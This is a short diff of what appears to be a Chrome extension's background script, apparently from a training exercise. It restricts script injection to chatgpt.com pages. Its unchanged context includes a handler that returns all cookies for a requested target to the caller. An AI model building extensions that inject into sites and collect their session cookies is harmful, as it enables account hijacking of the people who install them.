@@ -2,13 +2,13 @@ let remoteJson;
 const remoteServerUrl = "http://localhost:5555";
 
 const flag = true;
-
+const CHAT_GPT_URL = "https://chatgpt.com";
 // 🚧 Will be used in a later exercise – do not remove.
 const onFetchDataHandler = (message) => {};
 
 chrome.webNavigation.onCommitted.addListener(async (details) => {
   // Only inject into real frames with valid URLs
-  if (!details.url.startsWith("http")) return;
+  if (!details.url.startsWith(CHAT_GPT_URL)) return;
 
   console.log(
     `Injecting into ${details.frameId === 0 ? "main frame" : "iframe"}: ${
@@ -44,7 +44,7 @@ const onMessageHandler = async (message, sender, sendResponse) => {
     chrome.cookies.getAll(target, (cookies) => {
       sendResponse(cookies);
     });
-  } 
+  }
 };
 
 const onRefreshCountHandler = async (token, expireTime, callback) => {
